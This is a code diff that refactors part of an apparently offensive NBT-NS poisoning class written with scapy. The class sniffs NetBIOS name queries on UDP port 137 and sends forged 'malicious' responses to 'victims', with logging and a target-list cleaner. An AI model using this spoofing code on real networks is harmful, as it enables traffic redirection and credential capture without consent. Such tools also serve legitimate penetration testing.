@@ -40,45 +40,6 @@ class NBT_NS(PoisonNetwork):
         level: str = "INFO",
     ):
         super().__init__(ip, None, mac_address, iface, info_logger, level)
-        self.__targets_used = []
-        self.__logger_level = level
-        self.__info_logger = info_logger
-
-    @property
-    def logger_level(self) -> str:
-        return self.__logger_level
-
-    @logger_level.setter
-    def logger_level(self, level: str) -> None:
-        self.__logger_level = level
-
-    def __data_link_layer(self, pkt: packet) -> packet:
-        """[ Add link layer to response packet ]
-
-        Args:
-            pkt (packet): [ sniffed packet ]
-
-        Returns:
-            [ packet ]: [ Package with link layer added ]
-        """
-        return Ether(dst=pkt[Ether].src, src=self.mac_address)
-
-    def __network_layer(self, pkt: packet, response: packet) -> Tuple[packet.Type, str]:
-        """[ Add network layer to the response packet ]
-
-        Args:
-            pkt (packet): [ sniffed packet ]
-            response (packet): [ Packet to be send to the victim  ]
-
-        Returns:
-            Tuple[packet.Type, str]: [ malicious package and ip of the target ]
-        """
-        ip_of_the_packet = None
-        if pkt[IP].src == self.ip:
-            return response, ip_of_the_packet
-        response /= IP(dst=pkt[IP].src)
-        ip_of_the_packet = pkt[IP].src
-        return response, ip_of_the_packet
 
     def __transport_layer(self, response: packet) -> packet:
         """[ Add transport layer to the response packet ]
@@ -146,16 +107,15 @@ class NBT_NS(PoisonNetwork):
             response (packet): [ Malicious packet ]
             ip_of_the_packet (str): [ ip of the victim ]
         """
-        self.__info_logger.debug("Packet crafted: ")
-        self.__info_logger.debug(response.summary())
-        response.summary()
-        if ip_of_the_packet not in self.__targets_used:
-            self.__info_logger.log(
-                self.__logger_level,
+        self.info_logger.debug("Packet crafted: ")
+        self.info_logger.debug(response.summary())
+        if ip_of_the_packet not in self.targets_used:
+            self.info_logger.log(
+                self.logger_level,
                 f"{Fore.CYAN}(NBT_NS) Sending packet to {ip_of_the_packet}{Style.RESET_ALL}",
             )
             sendp(response, verbose=False)
-            self.__targets_used.append(ip_of_the_packet)
+            self.targets_used.append(ip_of_the_packet)
 
     def __craft_malicious_packets(self, pkt: packet) -> None:
         """[ Function to craft a malicious packet ]
@@ -163,28 +123,20 @@ class NBT_NS(PoisonNetwork):
         Args:
             pkt (packet): [ Sniffed packet ]
         """
-        if pkt.haslayer(NBNSQueryRequest):
-            response = self.__data_link_layer(pkt)
-            response, ip_of_the_packet = self.__network_layer(pkt, response)
+        if pkt.haslayer(NBNSQueryRequest) and pkt.haslayer(IP) and pkt[IP].src != self.ip:
+            response = self._data_link_layer(pkt)
+            response, ip_of_the_packet = self._network_layer(pkt, response)
             response = self.__transport_layer(response)
             response = self.__application_layer(pkt, response)
             self.__send_packet(response, ip_of_the_packet)
 
     def start_nbt_ns_poisoning(self) -> None:
         """[ Function to start the poisoner ]"""
-        self.__info_logger.log(self.__logger_level, "Starting nbt-ns poisoning...")
-        cleaner_thread = Thread(target=self.__cleaner)
-        cleaner_thread.daemon = True
-        cleaner_thread.start()
+        self.info_logger.log(self.logger_level, "Starting nbt-ns poisoning...")
+        self._start_cleaner()
         sniff(
             filter="udp and port 137",
             iface=self.iface,
             prn=self.__craft_malicious_packets,
             store=0,
         )
-
-    def __cleaner(self) -> None:
-        """[ Function to clean the list of objectives every 3 seconds ]"""
-        while True:
-            time.sleep(10)
-            self.__targets_used.clear()
